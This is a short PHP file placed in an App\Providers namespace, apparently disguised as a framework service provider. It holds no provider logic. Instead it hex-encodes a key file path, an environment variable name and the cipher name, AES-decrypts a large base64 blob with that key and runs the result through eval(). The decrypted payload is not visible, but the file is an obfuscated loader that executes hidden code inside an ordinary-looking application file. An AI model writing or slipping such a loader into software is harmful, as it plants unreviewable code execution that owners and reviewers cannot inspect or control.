<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PX/Zppec9ia0n1mGlwZaFQ==');

$c=base64_decode(

'1Zx0pkQWDSrONCORlDzg9h6ATMJz1mAKFbu1lSqImwqjg00giVUAn5ABbOnrOoPt7GMcEIMGXojn' .
'k+Mj7MvtxIHQxcv2q5tjAbx0sur6EzJx4qsohmkaHRLiIhZlQslTV16EZTMJ+SWgZ3MpGX8eSaGc' .
'dwPy/9pvQjl8wYyp3LR4R3kl4En2AsRru95r5ACwR1EiC6GKHQLdW3aUGy6LpYF1g0s9lLsjkepI' .
'7qewpZUmvnKB12rs5EJ1PWf4qm9/JIxiljd5kBxI4YACf72kr3NnPmNLR72H6GDTqrRTOo+FStUI' .
'+2NFXIONdbMSz1ZtO8o4Q+vMA9Tos6K8ciuhm3wLBkGop16PjfySLdsT8Hl260z6mmV97rZrohrO' .
'v/jAXwrn/TZ9wxbhxfyTlITHxTkuTPNfAnCIcHNtMn0gwAH/lVMcEZDYLpn/OWfSJumcNeTOprOu' .
'TDvLxsDU/PSPgk0N7LUzmzwDntiyTloHlHuHzlgGIiijI+CgYBArVE9UXWYxOvWR0YFMH4yYg+me' .
'iuHMoP0GaF+CmfjF+X5DfKmESs6r5bQ4SzM7DWUq9JPOcOpEtQpeaLx+G4ugfJkAMKRZ89QbbjaF' .
'FEo28e7OXDve9rUxGjeUySkBTFYBnKRWayBVdqiwyTWvKf8eIgCl0zR84gNPxLoh7F6ufGddLetl' .
'm+FsaEnPLI0UbqAjavylQMBsiyqL2d4WTMVpWEl6r4jOwC92giZD7gQr3U2AQ//vosqc4nevRjbx' .
'nsWTsax7NzJAC+E0M0WifjQouVJQvWEx+B4jJJ/j6rf2NC+G2+zL3zE5pK+X9kRd4F1at4TfDHrT' .
'YDk7f0bIXFKfOL0I12bNrzBZMEjrDvRC8Ktu4+6IzkQNNabrmzcB+uXieqT9jkrcOcYwiaw6A8wl' .
'rNhe0sPdEF6X5GMeQ2AdcPeoqvWk6y6olE/gBOux6RIe24EK'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

